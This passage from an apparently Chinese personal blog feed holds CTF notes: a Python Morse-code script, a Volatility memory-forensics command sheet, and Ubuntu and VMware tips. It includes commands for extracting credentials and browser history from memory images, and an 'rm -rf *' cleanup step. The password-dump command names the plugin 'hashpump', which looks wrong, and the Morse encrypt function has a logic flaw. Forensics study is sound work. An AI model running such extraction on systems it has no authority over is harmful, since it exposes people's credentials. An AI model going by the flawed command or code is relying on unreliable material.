<span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'-----'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'.----'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">'..---'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">:</span> <span class="token string">'...--'</span><span class="token punctuation">,</span>                     <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token string">'....-'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">:</span> <span class="token string">'.....'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">:</span> <span class="token string">'-....'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token string">'--...'</span><span class="token punctuation">,</span>                     <span class="token string">'8'</span><span class="token punctuation">:</span> <span class="token string">'---..'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">:</span> <span class="token string">'----.'</span><span class="token punctuation">,</span>                     <span class="token string">'.'</span><span class="token punctuation">:</span> <span class="token string">'.-.-.-'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">:</span> <span class="token string">'---...'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">:</span> <span class="token string">'--..--'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">:</span> <span class="token string">'-.-.-.'</span><span class="token punctuation">,</span>                     <span class="token string">'?'</span><span class="token punctuation">:</span> <span class="token string">'..--..'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">:</span> <span class="token string">'-...-'</span><span class="token punctuation">,</span> <span class="token string">'\''</span><span class="token punctuation">:</span> <span class="token string">'.----.'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">:</span> <span class="token string">'-..-.'</span><span class="token punctuation">,</span>                     <span class="token string">'!'</span><span class="token punctuation">:</span> <span class="token string">'-.-.--'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">:</span> <span class="token string">'-....-'</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">:</span> <span class="token string">'..--.-'</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">:</span> <span class="token string">'.-..-.'</span><span class="token punctuation">,</span>                     <span class="token string">'('</span><span class="token punctuation">:</span> <span class="token string">'-.--.'</span><span class="token punctuation">,</span> <span class="token string">')'</span><span class="token punctuation">:</span> <span class="token string">'-.--.-'</span><span class="token punctuation">,</span> <span class="token string">'$'</span><span class="token punctuation">:</span> <span class="token string">'...-..-'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">:</span> <span class="token string">'....'</span><span class="token punctuation">,</span>                     <span class="token string">'@'</span><span class="token punctuation">:</span> <span class="token string">'.--.-.'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">:</span> <span class="token string">'.-.-.'</span><span class="token punctuation">,</span>                     <span class="token punctuation">&#125;</span>      <span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>      cipher <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">for</span> s <span class="token keyword">in</span> message<span class="token punctuation">:</span>          cipher <span class="token operator">+=</span> MORSE_CODE_DICT<span class="token punctuation">.</span>get<span class="token punctuation">(</span>s<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span>          <span class="token keyword">if</span> s <span class="token operator">!=</span> message<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>              cipher <span class="token operator">+=</span> <span class="token string">' '</span>  <span class="token comment"># 每加密一个字符用空格隔开  </span>    <span class="token keyword">return</span> cipher      <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>      message <span class="token operator">+=</span> <span class="token string">' '</span>  <span class="token comment"># 在末尾添加额外空间以访问最后一个摩斯密码  </span>    decipher <span class="token operator">=</span> <span class="token string">''</span>      citext <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">global</span> i      <span class="token keyword">for</span> letter <span class="token keyword">in</span> message<span class="token punctuation">:</span>          <span class="token keyword">if</span> letter <span class="token operator">!=</span> <span class="token string">' '</span><span class="token punctuation">:</span>              i <span class="token operator">=</span> <span class="token number">0</span>              citext <span class="token operator">+=</span> letter          <span class="token keyword">else</span><span class="token punctuation">:</span>              i <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment"># 如果i=1表示一个新字符  </span>            <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>  <span class="token comment"># 如果i=2表示一个新单词  </span>                decipher <span class="token operator">+=</span> <span class="token string">' '</span>  <span class="token comment"># 添加空格来分隔单词  </span>            <span class="token keyword">else</span><span class="token punctuation">:</span>  <span class="token comment"># 使用它们的值访问密钥（加密的反向）  </span>                decipher <span class="token operator">+=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>MORSE_CODE_DICT<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token builtin">list</span><span class="token punctuation">(</span>MORSE_CODE_DICT<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span>citext<span class="token punctuation">)</span><span class="token punctuation">]</span>                  citext <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">return</span> decipher      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"           摩斯加解密系统             "</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"选择要进行的操作? (1:加密 or 2:解密) 你的选择: "</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token string">"1"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"1:加密"</span><span class="token punctuation">:</span>      input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入明文以加密: "</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>encrypt<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">elif</span> num <span class="token operator">==</span> <span class="token string">"2"</span> <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token string">"2:解密"</span><span class="token punctuation">:</span>      input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入密文以解密: "</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
    
    
    <summary type="html">杂项中的一些脚本，有的在线网站也可以实现，不过还是自己总结了一些，可以方便根据自己的需求修改源码</summary>
    
    
    
    <category term="便捷算法" scheme="https://www.4ss1du0us.cn/categories/%E4%BE%BF%E6%8D%B7%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MISC" scheme="https://www.4ss1du0us.cn/tags/MISC/"/>
    
    <category term="CTF刷题" scheme="https://www.4ss1du0us.cn/tags/CTF%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>内存取证</title>
    <link href="https://www.4ss1du0us.cn/2023/055090002e.html"/>
    <id>https://www.4ss1du0us.cn/2023/055090002e.html</id>
    <published>2023-05-08T07:56:58.000Z</published>
    <updated>2023-05-11T05:27:22.076Z</updated>
    
    <content type="html"><![CDATA[<h2 id="volatility-的安装"><a href="#volatility-的安装" class="headerlink" title="volatility 的安装"></a>volatility 的安装</h2><blockquote><p>Volatility 是一款开源的内存取证分析工具，支持 Windows、Linux、Mac、Android 等多类型操作系统系统的内存取证方式。该工具由 python 开发，<strong>volatility2 支持 python2</strong>、<strong>volatility3 支持 python3</strong> 环境</p></blockquote><ul><li><p>通过 snap 安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> snap <span class="token function">install</span> volatility-phocean<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>通过 git 安装 volatility3（需先安装 python3 环境）</p></li></ul><blockquote><p>Github地址：<a href="https://github.com/volatilityfoundation/volatility3">https://github.com/volatilityfoundation/volatility3</a></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/volatilityfoundation/volatility3<span class="token builtin class-name">cd</span> volatility3pip3 <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements-minimal.txt<span class="token function">sudo</span> python3 setup.py build <span class="token function">sudo</span> python3 setup.py <span class="token function">install</span><span class="token function">sudo</span> python3 vol.py <span class="token parameter variable">-h</span>   <span class="token comment"># 验证安装</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="volalitily-的使用"><a href="#volalitily-的使用" class="headerlink" title="volalitily 的使用"></a>volalitily 的使用</h2><blockquote><p>常见的取证文件后缀名为：raw、vmem、img、dmg</p><p>命令中 <code>volatility</code> 可以替换为 <code>python3 vol.py</code></p></blockquote><hr><h3 id="获取系统基本信息"><a href="#获取系统基本信息" class="headerlink" title="获取系统基本信息"></a>获取系统基本信息</h3><blockquote><p><strong>首先必须通过此命令获取系统版本信息，如果操作系统错误，是无法正确读取内存信息的</strong></p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 imageinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 filescanvolatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 filescan <span class="token operator">|</span> <span class="token function">grep</span> xxxvolatility <span class="token parameter variable">-f</span> 镜像名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 filescan <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-E</span> <span class="token string">'jpg|png|jpeg|bmp|gif'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h3 id="提取文件"><a href="#提取文件" class="headerlink" title="提取文件"></a>提取文件</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 dumpfiles <span class="token parameter variable">-Q</span> 内存地址 --dump-dir<span class="token operator">=</span>保存路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="列出进程信息"><a href="#列出进程信息" class="headerlink" title="列出进程信息"></a>列出进程信息</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本  pslist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="提取进程内容"><a href="#提取进程内容" class="headerlink" title="提取进程内容"></a>提取进程内容</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 memdump <span class="token parameter variable">-p</span> 进程的PID <span class="token parameter variable">-D</span> 保存路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="获取浏览器浏览历史"><a href="#获取浏览器浏览历史" class="headerlink" title="获取浏览器浏览历史"></a>获取浏览器浏览历史</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 iehistory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="获取内存中的注册表"><a href="#获取内存中的注册表" class="headerlink" title="获取内存中的注册表"></a>获取内存中的注册表</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 hivelist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="查看截图"><a href="#查看截图" class="headerlink" title="查看截图"></a>查看截图</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 screenshot --dump-dir<span class="token operator">=</span>保存路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="获取-cmd-输入"><a href="#获取-cmd-输入" class="headerlink" title="获取 cmd 输入"></a>获取 cmd 输入</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 cmdline<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="查看-cmd-执行的文件"><a href="#查看-cmd-执行的文件" class="headerlink" title="查看 cmd 执行的文件"></a>查看 cmd 执行的文件</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 cmdscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="提取账户密码"><a href="#提取账户密码" class="headerlink" title="提取账户密码"></a>提取账户密码</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 hashpump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="查看网络连接"><a href="#查看网络连接" class="headerlink" title="查看网络连接"></a>查看网络连接</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 netscanvolatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 netscan<span class="token operator">|</span><span class="token function">grep</span> ESTABLISHED   <span class="token comment"># 查看已建立的网络连接</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="查看桌面文件"><a href="#查看桌面文件" class="headerlink" title="查看桌面文件"></a>查看桌面文件</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">volatility <span class="token parameter variable">-f</span> 文件名 <span class="token parameter variable">--profile</span><span class="token operator">=</span>系统版本 filescan <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Desktop"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr>]]></content>
    
    
    <summary type="html">使用 Volatility 进行内存取证的一些指令，包括安装和具体使用</summary>
    
    
    
    <category term="杂项" scheme="https://www.4ss1du0us.cn/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF笔记" scheme="https://www.4ss1du0us.cn/tags/CTF%E7%AC%94%E8%AE%B0/"/>
    
    <category term="MISC" scheme="https://www.4ss1du0us.cn/tags/MISC/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu22.04操作指令</title>
    <link href="https://www.4ss1du0us.cn/2023/057645d679.html"/>
    <id>https://www.4ss1du0us.cn/2023/057645d679.html</id>
    <published>2023-05-02T07:23:24.000Z</published>
    <updated>2023-05-11T05:21:10.344Z</updated>
    
    <content type="html"><![CDATA[<h2 id="修改-host-并清除-DNS-缓存"><a href="#修改-host-并清除-DNS-缓存" class="headerlink" title="修改 host 并清除 DNS 缓存"></a>修改 host 并清除 DNS 缓存</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/hosts<span class="token comment"># 检查目前的缓存大小</span>resolvectl statistics<span class="token comment"># 清理缓存，清理完后 Current Cache Size 变为 0</span>resolvectl flush-caches<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="为应用创建桌面图标"><a href="#为应用创建桌面图标" class="headerlink" title="为应用创建桌面图标"></a>为应用创建桌面图标</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/桌面<span class="token function">sudo</span> <span class="token function">vim</span> 程序名.desktop<span class="token comment"># 写入如下内容：</span>-------------------------------------------<span class="token punctuation">[</span>Desktop Entry<span class="token punctuation">]</span><span class="token assign-left variable">Name</span><span class="token operator">=</span>  <span class="token comment"># 程序名</span><span class="token assign-left variable">Comment</span><span class="token operator">=</span>  <span class="token comment"># 程序名</span><span class="token assign-left variable">Exec</span><span class="token operator">=</span>  <span class="token comment"># 程序路径</span><span class="token assign-left variable">Icon</span><span class="token operator">=</span>  <span class="token comment"># 应用的图标，形如 xxx.png</span><span class="token assign-left variable">Terminal</span><span class="token operator">=</span>false<span class="token assign-left variable">Type</span><span class="token operator">=</span>Application<span class="token assign-left variable">Categories</span><span class="token operator">=</span>Developer<span class="token punctuation">;</span>-------------------------------------------<span class="token comment"># 增加执行权限</span><span class="token function">sudo</span> <span class="token function">chmod</span> a+x 程序名.desktop<span class="token comment"># 在桌面图标上右键，选择 "允许运行"，双击图标验证是否能成功打开</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
    
    
    <summary type="html">一些日常使用 Ubuntu 的指令</summary>
    
    
    
    <category term="Linux" scheme="https://www.4ss1du0us.cn/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.4ss1du0us.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>从物理机拖到Linux虚拟机中的文件消失了？</title>
    <link href="https://www.4ss1du0us.cn/2023/0441d1faf8.html"/>
    <id>https://www.4ss1du0us.cn/2023/0441d1faf8.html</id>
    <published>2023-04-29T12:36:24.000Z</published>
    <updated>2023-05-14T00:41:54.321Z</updated>
    
    <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><blockquote><p>有时候虚拟机像是 bug 了一样，明明安装了 VMtools，从物理机拖放文件还是会失败：</p><ol><li><p>如果直接将文件拖进虚拟机会显示 🚫，不妨试试在物理机中将文件复制后粘贴到虚拟机哦（如果还是不行，试试重装  VMtools）</p></li><li><p>但有时候将文件拖进虚拟机没有显示 🚫，文件也拖放成功了，但文件却并没有出现在对应的文件夹中，当然这就是本文要解决的问题</p></li></ol></blockquote><ul><li>以物理机往 Ubuntu 虚拟机拖放 <code>CLion</code> 为例：</li></ul><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%861.png" alt="从物理机拖到Linux虚拟机中的文件消失了1.png"></p><ol><li>可以看到，虚拟机没有提示 🚫，拖放操作是没有问题的</li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%862.png" alt="从物理机拖到Linux虚拟机中的文件消失了2.png"></p><ol start="2"><li>拖放后，物理机开始复制文件到 Ubuntu 虚拟机</li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%863.png" alt="从物理机拖到Linux虚拟机中的文件消失了3.png"></p><ol start="3"><li>但是发现复制结束后，桌面上什么都没有，左上角还有个像卡 bug 了一样的白图标</li></ol><hr><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><blockquote><p>其实，如果在拖放文件到虚拟机的时候没有显示 🚫，并且会有一个 <code>正在将文件 &quot;xxx&quot; 复制到虚拟机</code> 的弹窗，那说明文件是已经成功移到虚拟机了，只是没有移到你想放的文件夹下</p><p><strong>VMware Workstation 会将用户拖放到虚拟机的文件存放在一个叫 <code>drag_and_drop</code> 的文件夹内，只需手动操作一下即可</strong></p></blockquote><hr><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><ol><li>打开主目录，并在主目录里打开终端（或直接 <code>cd ~</code>）<br><code>ls -a</code> 查看主目录下所有文件</li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%864.png" alt="从物理机拖到Linux虚拟机中的文件消失了4.png"></p><ol start="2"><li>进到名为 <code>.cache</code> 的隐藏文件夹，一路 <code>ls -a</code> 查看，并进到 <code>~/.cache/vmware/drag_and_drop</code> 目录下</li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%865.png" alt="从物理机拖到Linux虚拟机中的文件消失了5.png"></p><ol start="3"><li>这个目录下有 <code>n</code> 个文件夹，<strong>这些文件夹里存放的就是用户从物理机拖到虚拟机里的东西</strong>（<em>一般最左边的就是最近一次拖放的</em>）</li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%866.png" alt="从物理机拖到Linux虚拟机中的文件消失了6.png"></p><ol start="4"><li>只需将这里面对应的文件移出去即可<br>例如我将 <code>CLion</code> 移到主目录下：<code>mv ./CLion-2022.3.1.tar.gz ~</code></li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%867.png" alt="从物理机拖到Linux虚拟机中的文件消失了7.png"></p><ol start="5"><li>现在查看主目录的文件夹，就能看到你拖到虚拟机里的文件了</li></ol><hr><h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><h3 id="定期清理"><a href="#定期清理" class="headerlink" title="定期清理"></a>定期清理</h3><ol><li><p>因为每次拖放文件到虚拟机都会在 <code>~/.cache/vmware/drag_and_drop</code> 目录下生成一个文件，长此以往，会特别占用虚拟机的空间</p></li><li><p>所以我们可以定期到 <code>~/.cache/vmware/drag_and_drop</code> 目录下执行 <code>rm -rf *</code>，删除 <code>drag_and_drop</code> 目录下的全部文件</p></li></ol><blockquote><p>在 Windows 虚拟机中同理，<code>Win + R</code> 打开 <code>运行</code>，在 <code>运行</code> 中输入 <code>%temp%</code><br>或者打开 <code>C:\Users\用户名\AppData\Local\Temp</code> 路径<br>在 Temp 文件夹中有一个名为 <code>vmware-用户名</code> 的文件夹，里面存放的也是拖放到虚拟机中的文件</p></blockquote><hr><h3 id="共享文件夹"><a href="#共享文件夹" class="headerlink" title="共享文件夹"></a>共享文件夹</h3><blockquote><p>如果往虚拟机中拖放文件、复制文件经常出 bug，也可以通过共享文件夹来向虚拟机传送文件<br>（但是这种方式将物理机和虚拟机联系到了一起，我也不知道开启共享文件夹后，虚拟机病毒会不会影响到物理机）</p></blockquote><ol><li>首先开启共享文件夹，<code>虚拟机 --&gt; 设置 --&gt; 选项 --&gt; 共享文件夹</code></li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%868.png" alt="从物理机拖到Linux虚拟机中的文件消失了8.png"></p><ol start="2"><li>设置<code>总是启用</code>，<code>添加</code>共享文件夹，选择物理机上的一个文件夹，作为物理机和虚拟机的共享文件夹</li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%869.png" alt="从物理机拖到Linux虚拟机中的文件消失了9.png"></p><ol start="3"><li><p>后面的保持默认设置即可</p></li><li><p>打开终端，输入 <code>vmware-hgfsclient</code> 检测是否设置成功，我设置的共享文件夹名字叫 <code>&quot;ShareFolder&quot;</code></p></li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8610.png" alt="从物理机拖到Linux虚拟机中的文件消失了10.png"></p><ol start="5"><li>一般来说，Linux 中的共享文件夹在目录 <code>/mnt/hgfs</code> 下，也可以在如下位置查看：</li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8611.png" alt="从物理机拖到Linux虚拟机中的文件消失了11.png"></p><ol start="6"><li><p>你可以通过把文件放在物理机的 <code>ShareFolder</code> 文件夹下，然后 Ubuntu 虚拟机就可以访问到了</p></li><li><p>如果在目录 <code>/mnt/hgfs</code> 下，还是访问不到你放置的文件<br>或者 <code>cd /mnt/hgfs</code> 后 <code>ls -a</code> 发现什么都没有<br>在终端输入：<code>vmhgfs-fuse .host:/ /mnt/hgfs</code>（将物理机的共享文件夹挂载到目录 <code>/mnt/hgfs</code> 下）</p></li><li><p>退出目录，重新进到目录 <code>/mnt/hgfs</code> 下，即可发现正常访问</p></li></ol><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8612.png" alt="从物理机拖到Linux虚拟机中的文件消失了12.png"></p><p><img src="https://4ss1du0us-1317553172.cos.ap-chengdu.myqcloud.com/%E4%BB%8E%E7%89%A9%E7%90%86%E6%9C%BA%E6%8B%96%E5%88%B0Linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%B6%88%E5%A4%B1%E4%BA%8613.png" alt="从物理机拖到Linux虚拟机中的文件消失了13.png"></p><blockquote><p>如果是 Windows 系列的虚拟机，查看共享文件夹就更简单了，可以直接挂载到 <code>&quot;网络&quot;</code> 